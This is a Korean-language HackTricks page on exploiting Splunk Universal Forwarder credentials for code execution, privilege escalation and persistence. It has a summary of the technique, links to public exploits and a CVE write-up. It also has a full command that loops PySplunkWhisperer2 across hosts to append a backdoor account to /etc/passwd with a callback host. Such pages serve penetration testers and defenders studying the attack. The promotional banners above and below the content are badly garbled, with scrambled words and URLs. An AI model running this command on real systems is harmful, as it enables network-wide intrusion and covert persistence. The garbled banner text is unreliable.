# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

만약 **내부** 또는 **외부**에서 머신을 **열거**하는 중에 **Splunk가 실행 중**인 것을 발견하고, 운이 좋게도 **유효한 자격 증명**을 알고 있다면, **Splunk 서비스를 악용**하여 Splunk를 실행하는 사용자로서 **쉘을 실행**할 수 있습니다. 만약 root가 실행 중이라면, root 권한으로 상승할 수 있습니다.

또한 이미 **root**인 경우 Splunk 서비스가 **localhost**에서만 수신 대기하지 않는다면, Splunk 서비스에서 **비밀번호** 파일을 **가로채고** 비밀번호를 **크랙**하거나, **새로운** 자격 증명을 추가할 수 있습니다. 그리고 호스트에서 지속성을 유지할 수 있습니다.

아래 첫 번째 이미지에서 Splunkd 웹 페이지가 어떻게 생겼는지 볼 수 있습니다.



## Splunk Universal Forwarder Agent Exploit Summary

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)를 확인하세요. 이것은 요약입니다:

**Exploit Overview:**
Splunk Universal Forwarder Agent (UF)를 대상으로 하는 익스플로잇은 공격자가 에이전트 비밀번호를 사용하여 에이전트를 실행하는 시스템에서 임의의 코드를 실행할 수 있게 하여 전체 네트워크를 위험에 빠뜨릴 수 있습니다.

**Key Points:**
- UF 에이전트는 수신 연결이나 코드의 진위를 검증하지 않아 무단 코드 실행에 취약합니다.
- 일반적인 비밀번호 획득 방법에는 네트워크 디렉토리, 파일 공유 또는 내부 문서에서 찾는 것이 포함됩니다.
- 성공적인 익스플로잇은 손상된 호스트에서 SYSTEM 또는 root 수준의 접근, 데이터 유출 및 추가 네트워크 침투로 이어질 수 있습니다.

**Exploit Execution:**
1. 공격자가 UF 에이전트 비밀번호를 획득합니다.
2. Splunk API를 사용하여 에이전트에 명령이나 스크립트를 전송합니다.
3. 가능한 작업에는 파일 추출, 사용자 계정 조작 및 시스템 손상이 포함됩니다.

**Impact:**
- 각 호스트에서 SYSTEM/root 수준의 권한으로 전체 네트워크가 손상됩니다.
- 탐지를 피하기 위해 로깅을 비활성화할 가능성.
- 백도어 또는 랜섬웨어 설치.

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 공개 익스플로잇:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk 쿼리 악용

**자세한 내용은 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) 게시물을 확인하세요.**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
